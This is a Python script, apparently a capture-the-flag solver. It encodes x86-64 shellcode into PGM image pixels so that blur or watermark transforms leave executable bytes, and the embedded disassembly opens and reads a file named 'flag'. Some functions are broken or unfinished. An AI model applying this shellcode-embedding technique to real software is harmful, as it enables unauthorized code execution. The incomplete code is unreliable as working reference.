#!/bin/python3
# TODO read from objdump
# objdump -d --insn-width=10 exploit_basic.o

import sys
import copy
import os

# outdated. now we read from a saved .dmp file
code = """
   0:	e8 00 00 00 00                	callq  5 <main+0x5>
   5:	58                            	pop    %rax
   6:	55                            	push   %rbp
   7:	48 89 e5                      	mov    %rsp,%rbp
   a:	48 83 ec 32                   	sub    $0x32,%rsp
   e:	48 89 45 d8                   	mov    %rax,-0x28(%rbp)
  12:	64 48 8b 04 25 28 00 00 00    	mov    %fs:0x28,%rax
  1b:	48 89 45 f8                   	mov    %rax,-0x8(%rbp)
  1f:	31 c0                         	xor    %eax,%eax
  21:	48 c7 45 f0 80 21 00 00       	movq   $0x2180,-0x10(%rbp)
  29:	48 83 ec 08                   	sub    $0x8,%rsp
  2d:	41 b9 00 00 00 00             	mov    $0x0,%r9d
  33:	41 b8 ff ff ff ff             	mov    $0xffffffff,%r8d
  39:	41 ba 22 00 00 00             	mov    $0x22,%r10d
  3f:	ba 03 00 00 00                	mov    $0x3,%edx
  44:	be 32 00 00 00                	mov    $0x32,%esi
  49:	bf 00 00 00 00                	mov    $0x0,%edi
  4e:	b8 09 00 00 00                	mov    $0x9,%eax
  53:	0f 05                         	syscall 
  55:	48 89 45 e8                   	mov    %rax,-0x18(%rbp)
  59:	48 8b 45 e8                   	mov    -0x18(%rbp),%rax
  5d:	c7 00 66 6c 61 67             	movl   $0x67616c66,(%rax)
  63:	48 8b 7d e8                   	mov    -0x18(%rbp),%rdi
  67:	be 00 00 00 00                	mov    $0x0,%esi
  6c:	ba 00 00 00 00                	mov    $0x0,%edx
  71:	b8 02 00 00 00                	mov    $0x2,%eax
  76:	0f 05                         	syscall 
  78:	89 45 e4                      	mov    %eax,-0x1c(%rbp)
  7b:	8b 7d e4                      	mov    -0x1c(%rbp),%edi
  7e:	48 8b 75 d8                   	mov    -0x28(%rbp),%rsi
  82:	ba 1e 00 00 00                	mov    $0x1e,%edx
  87:	b8 00 00 00 00                	mov    $0x0,%eax
  8c:	0f 05                         	syscall 
  8e:	c9                            	leaveq 
  8f:	c3                            	retq
"""

WIDTH = 200
HEIGHT = 200

base = os.path.dirname(os.path.abspath(__file__))

def getCode(file):
	with open(file) as inf:
		code = inf.readlines()
	cmds = []
	for line in code:
		line = line.rstrip()
		if line == "" or line.startswith("0") or line == "	...":
			continue
		parts = line.split("\t")
		bs = parts[1].strip().replace(" ", "")
		cmds += [bytes.fromhex(bs)]
	return cmds

def genWatermark(codeDmp, imageOut):
	cmds = getCode(codeDmp)
	with open(base + "/../src/watermark.ppm", "rb") as inf:
		wm = inf.read()
		while wm[-1] == 10:
			wm = wm[:-1]
		l1 = wm.find(b"\n")
		l2 = wm.find(b"\n", l1+1)
		l3 = wm.find(b"\n", l2+1)
		wm = wm[l3+1:]
		wm = [wm[i] for i in range(0, len(wm), 3)]
		assert len(wm) == 200 * 200, wm

	def fits(where, start, length):
		if start + length > len(where):
			return False
		return where[start:start+length].count(0) == 0

	# embed with jumping
	jmpStart = 0
	scan = 2
	for cmd in cmds:
		need = 2 + len(cmd)
		while scan < len(wm) and not fits(wm, scan, need):
			scan += 1
			if scan - jmpStart > 100 and fits(wm, scan, 2):
				#print("overjump at ", scan)
				# insert in between jump to avoid >7 bit distances
				wm[jmpStart] = 0xEB
				wm[jmpStart+1] = scan - jmpStart - 2
				jmpStart = scan
				scan += 2
		if scan >= len(wm):
		    print("No suitable location found for %d byte sequence" % (need))
		    sys.exit(1)
		#print("jump at ", scan)
		# now put at scan
		for i in range(len(cmd)):
			wm[scan + i] = cmd[i]
		# add previous jump
		wm[jmpStart] = 0xEB # jmp rel
		wm[jmpStart+1] = scan - jmpStart - 2
		# update indexes
		jmpStart = scan + len(cmd)
		scan = scan + len(cmd) + 2

	for x in wm:
		if x < 0 or x > 255:
			print(x)
	with open(imageOut, "wb") as outf:
		outf.write("P5\n200 200 255\n".encode('utf-8'))
		outf.write(bytearray(wm))

cmds = []
seq = [0]
row0 = [0x10]
row1 = [0x10]
deepest = -1

def lblur(cid, pos):
	global cmds, seq, row0, row1, deepest
	if pos > deepest:
		print("New deep ", pos)
		deepest = max(deepest, pos)
	if cid >= len(cmds):
		print("completed")
		print(seq)
		return True
	if pos >= len(cmds[cid]):
		print("next instr: {}".format(cid))
		return blur(left, mid, cid+1, 0)
	want = cmds[cid][pos] * 6
	needMin = want - row0[-1] - row1[-1] - row0[-2] - row1[-2]
	if needMin >= 256 * 2:
		return False
	for lower in range(256):
		needRes = needMin - lower
		if needRes >= 256 or needRes < -10:
			continue
		row0.append(lower)
		for i in range(6):
			#seq += [needMin+i]
			row1.append(needRes + i)
			b = lblur(cid, pos+1)
			if b:
				return True
			else:
				row1.pop()
		row0.pop()
#	print(row0, row1, "need", cmds[cid][pos], needMin)
	return False
	

def lineBlur():
	global cmds, seq, row0, row1, deepest
	fileName = "flag"
	#for line in code.strip().split("\n"):
	#	parts = line.split("\t")
	#	bs = parts[1].strip().replace(" ", "")
	#	cmds += [bytes.fromhex(bs)]
	cmds = [[ord('f'), ord('l'), ord('a'), ord('g')]]#cmds[3:4]
	for i in range(256):
		row0 += [i]
		print("LEFT: {}".format(i))
		for j in range(256):
			row1 += [j]
			b = lblur(0, 0)
			if b:
				break
			else:
				row1.pop()
		row0.pop()
	print(len(row0), len(row1), deepest)
#lineBlur()

def genBlock(c):
	x = c[0]
	y = c[1]
	swap = False
	if x < y:
		x, y = y, x
		swap = True
	# now, x >= y
	larger = 9 * x
	smaller = 9 * y
	if smaller <= 3 * 255:
		c2 = smaller
		c3 = 0
		c4 = 0
		c1 = larger - smaller
	else:
		c2 = 3 * 255
		larger -= 255 * 3
		smaller -= 255 * 3
		if smaller <= 3 * 255:
			c3 = smaller
			c4 = 0
			c1 = larger - smaller
		else:
			c3 = 3 * 255
			smaller -= 3 * 255
			larger -= 3 * 255
			c4 = smaller
			c1 = larger
	cs = [c1, c2, c3, c4]
	if any([x < 0 or x > 3 * 255 for x in cs]):
		return None
	if swap:
		cs = list(reversed(cs))
	for ci in range(2, len(c)):
		cs = append(cs, c[ci])
		if cs == None:
			return None
	return cs

def getMid(a, b):
	# a := 6 fields
	# b := 3 fields
	acceptable = [0x3c, 0x70, 0xd0, 0xdf] # forms a 2-byte 'nop' 
	# TODO: jumps mybe need +1 not not jump
	for x in acceptable:
		c = (9 * x - a)
		if c >= 0 and c <= 3 * 255:
			for y in acceptable:
				d = 9 * y - c - b
				if d >= 0 and d <= 3 * 255:
					return c, d
	print("Impossible for %d and %d" % (a, b))
			
BLOCK_WIDTH = 16
def blur(dump, image):
	global WIDTH, HEIGHT
	fail = False
	cmds = getCode(dump)

	# init
	img = []
	for r in range(HEIGHT):
		img += [[0] * WIDTH]
	# now fill the exploiting stuff, can be overwritten later. hopefully not with 0x0
	img[-1][-4] = 1
	img[-2][-4] = 1
	img[-3][-4] = 1
	img[-4][-4] = 1
	img[-4][-3] = 1
	img[-4][-2] = 1
	img[-4][-1] = 1
	
	#for c in cmds:	
	#	assert len(c) <= 2
	
	# combine to 2 byte instructions
	# add jmp after every 14 instructions
	cmds2 = []
	i = 0
	while i < len(cmds):
		if len(cmds2) % 15 == 13:
			# jmp 124 / 122 bytes
			# use jo and jno to make unconditional
			#cmds2 += [b'\x70\x7c', b'\x71\x7a']
			pass
		if len(cmds[i]) >= 2:
			cmds2 += [cmds[i]]
			i += 1
		elif i+1 < len(cmds) and len(cmds[i+1]) == 1 and abs(ord(cmds[i]) - ord(cmds[i+1])) < 0x60:
			cmds2 += [cmds[i] + cmds[i+1]]
			i += 2
		else:
			cmds2 += [cmds[i] + b'\x90'] # just add a nop
			i += 1
	cmds = [b'\x3f\x90'] + cmds2
	# need this so the first two bytes in the second line form a valid instruction
	#cmds[0] = b'\x59\x90' + cmds[0]
	# enrich commands with jumps
	blocks = []
	for i in range(len(cmds)):
		seq = genBlock(cmds[i])
		if seq == None:
			print("Failed for {}".format(["%x" % int(x) for x in cmds[i]]))
			fail = True
			continue
		adds = [
			# all are extended by the two jumps '0x70, 104, 0x71, 102' (but with corrected jump distan
			[0x70, 0xBEEF, 0x71, 0xBEEF],
			[0x90, 0x70, 0xBEEF, 0x71, 0xBEEF], # nop
			[0x90, 0x90, 0x70, 0xBEEF, 0x71, 0xBEEF], # nop nop
			[0x48, 0x90, 0x70, 0xBEEF, 0x5a, 0x52, 0x71, 0xBEEF], # rex nop, pop edx, push edx
			[0x3c, 0xFF // 4, 0x70, 0xBEEF, 0x71, 0xBEEF], # cmp
			[0x5a, 0x52, 0x70, 0xBEEF, 0x71, 0xBEEF], # pop edx, push edx
			[0x98, 0x70, 0xBEEF, 0x71, 0xBEEF], # breaks when rdx is needed
			#[0x59, 0x90, 0x51, 0x71, 98, 0x70, 96] # pop ecx, nop,push ecx ## TOO LONG
		]
		found = False
		for add in adds:
			s2 = copy.copy(seq)
			fail = False
			for ai in range(len(add)):
				a = add[ai]
				if a == 0xBEEF: # jump distance
					a = 104 - (ai-1) - (len(cmds[i])-2)
				need = a * 9 - s2[-1] - s2[-2]
				if need < 0 or need > 3 * 255:
					#print("\tFail after i need ", need, " after seq ", str(s2), " for ", str(add))
					fail = True
					break
				s2 += [need]
			if not fail:
				#print("POssible")
				found = True
				blocks += [s2 + [0] * (BLOCK_WIDTH - len(s2))]
				break
		if not found:
			print("Impossible for ", ["%x" % int(x) for x in cmds[i]], seq)
	if fail:
		sys.exit(1)
#		needJmp = 9 * 0x71 - seq[-1] - seq[-2]
#		if needJmp < 0:
#			needNop = 9 * 0x90 - seq[-1] - seq[-2]
#			if needNop < 0 or needNop > 3 * 255:
#				print("Impossible nop")
#			else:
#				needJmp2 = 9 * 0x71 - seq[-1] - needNop
#				if needJmp2 < 0 or needJmp2 > 3 * 255:
#					print("Impossible jmp2")
#				else:
#					seq += [needNop, needJmp2]
#		elif needJmp > 3 * 255:
#			needCmp = 9 * 0x3c - seq[-1] - seq[-2]
#			if needCmp < 0 or needCmp > 3 * 255:
#				print("Impossible cmp")
#			else:
#				cmpVal = 1 * 255 # mostly arbitrary
#				needJmp2 = 9 * 0x71 - needCmp - cmpVal
#				if needJmp2 < 0 or needJmp2 > 3 * 255:
#					print("Impossible cmp-jmp2", needJmp2)
#				else:
#					seq += [needCmp, cmpVal, needJmp2]
#		else:
#			seq += [needJmp]
#		# want to jump to next 104 times offset
#		wantJmp = 102 - (len(seq) - 1)
#		needDist = 9 * wantJmp - seq[-1] - seq[-2] + 2*9 # dont know why +2(*9)
#		if needDist < 0:
#			needNop = 9 * 0x90 - seq[-1] - seq[-2]
#		assert needDist >= 0 and needDist <= 3 * 255, str(cmds[i]) + " :: " + str(seq) + " :: need: " + str(needDist)
#		seq += [needDist]
#		seq += [0] * (8 - len(seq))
#		blocks += [seq]
#

	# JMP 119
#	img[0][0] = 0xFC
#	img[0][1] = 0xFF
#	img[0][2] = 0x80
#	img[1][0] = 0xFF
#	img[1][1] = 0xFF
#	fill(img, 0, 0, [2 * 0xFF, 507, 54])
	
#	img[0][128 -8] = 0xFF
#	img[0][129 -8] = 0xFC
#	img[0][130 -8] = 0x0
#	img[0][131 -8] = 0xC7
#	img[1][128 -8] = 0xFF
#	img[1][129 -8] = 0xFF
	# JMP 94 -> 217
#	fill(img, 0, 120, [2*0xFF, 507, 0, 339])

	offset = 0
	print(len(blocks))
	for i in range(len(blocks)):
		pos = ((100 + BLOCK_WIDTH // 2) * i + offset)
		sr = pos // 200
		sc = pos % 200
		if sc + 8 >= WIDTH:
			# 48 3d ?? ?? ?? ?? = cmp $????????, %rax
			#fill(img, sr, sc, [0, 540, 0, 540, 0, 540, 0, 540]) # 4 nop compares
			fill(img, sr, sc, [441, 0, 99, 0, 549, 0, 0, 0]) # 4 nop compares
			offset += 8
			pos += 8
			sr = pos // 200
			sc = pos % 200
		for cc in range(BLOCK_WIDTH):
			x = 0
			rem = blocks[i][cc]
			while rem > 0:
				img[sr + x][sc + cc] = min(255, rem)
				rem -= min(255, rem)
				x += 1
	
	im = [item for sublist in img for item in sublist]
	with open(image, "wb") as outf:
		outf.write("P5\n200 200 255\n".encode('utf-8'))
		outf.write(bytearray(im))

# old is list of columnsum values
def append(old, want):
	w = want * 9
	ending = sum(old[-2:])
	new = w - ending
	if new < 0 or new > 3 * 255:
		return None
	return old + [new]

def fill(img, sr, sc, nums):
	for cc in range(len(nums)):
		x = 0
		rem = nums[cc]
		while rem > 0:
			img[sr + x][sc + cc] = min(255, rem)
			rem -= min(255, rem)
			x += 1

def genSimple(binary, outf):
	global WIDTH, HEIGHT
	with open(binary, "rb") as inf:
		code = inf.read()
	code += b'0' * (WIDTH * HEIGHT - len(code))
	with open(outf, "wb") as outf:
		outf.write("P5\n200 200 255\n".encode('utf-8'))
		outf.write(code)

c = sys.argv[1]
binary = sys.argv[2]
image = sys.argv[3]

if c == "lineblur":
	lineBlur()
elif c == "blur":
	blur(binary, image)
elif c == "watermark":
	genWatermark(binary, image)
elif c == "simple":
	genSimple(binary, image)

# TODO complete
def genHistogram(fileName):
	# SUM := number of bytes needed in image (<= 40.000)
	# LEN := number of shellcode bytes (<= 512)
	
	# SUM
	#  3327 (base AL)
	#  len(fileName) * 0x05 * 256 ~~ 12800 (10 bytes len)
	#  2820 (ADD.. dummy)
	
	# LEN
	#  2 (base AL)
	#  len(fileName) * 2 ~~ 20
	#  len(fileName) * 3 ~~ 30 (ADD.. dummy)
	code = []
	code += [0x0C, 0xFF] # OR AL, 0xFF
	al = 255
	for c in fileName:
		add = (ord(c) - al + 256) % 256
		code += [0x04, add] # ADD AL, add
		code += [0x00, 0x04, 0x0A] # ADD [rdx+rcx], al
	
